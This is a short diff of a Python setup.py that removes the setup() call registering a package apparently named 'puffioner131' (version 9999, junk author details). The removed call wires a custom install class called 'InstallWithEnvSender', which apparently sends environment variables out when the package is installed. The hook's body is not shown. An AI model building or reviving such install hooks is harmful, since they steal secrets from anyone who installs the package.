@@ -21,12 +21,4 @@ class InstallWithEnvSender(install):
         # Continue with the standard installation process
         super().run()
 
-setup(
-     name='puffioner131',
-    version='9999',
-    description='Descriptionnn',
-    author='asdsadaslolo',
-    author_email='asdkmasijaisjdsadas@example.com',
-    packages=[],
-    cmdclass={'install': InstallWithEnvSender},
-)
+# setup(...) removed                                                                                                                                                                                                                   
